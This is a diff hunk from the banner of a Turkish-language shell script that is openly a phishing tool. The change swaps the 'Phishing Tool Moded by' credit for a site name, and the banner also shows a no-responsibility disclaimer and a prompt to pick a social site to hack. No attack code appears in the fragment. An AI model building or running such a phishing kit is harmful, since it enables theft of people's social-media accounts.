@@ -74,7 +74,7 @@ printf "\e[1;91m  \ \ /\ / /  | |_| |  \ V /   |  _|   | |\/| | | |_) | |  _|   
 printf "\e[1;92m   \ V  V /   |  _  |   | |    | |___  | |  | | |  _ <  | |__   \e[0m\n"
 printf "\e[1;92m    \_/\_/    |_| |_|   |_|    |_____| |_|  |_| |_| \_\ |_____| \e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;94m Phishing Tool Moded by @whyemre \e[0m\e[1;93m.:.:.\e[0m\n\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;94m ayyildiz.org & @whyemre \e[0m\e[1;93m.:.:.\e[0m\n\n"
 printf "  \e[101m\e[1;77m:: Sorumluluk Reddi Beyanı: Geliştiriciler hiçbir sorumluluk üstlenmez. ::\e[0m\n"
 printf " \n"
 printf " \e[36;1m.:. Hacklemek istediğiniz herhangi bir sosyal siteyi seçin .:.\e[0m\n"
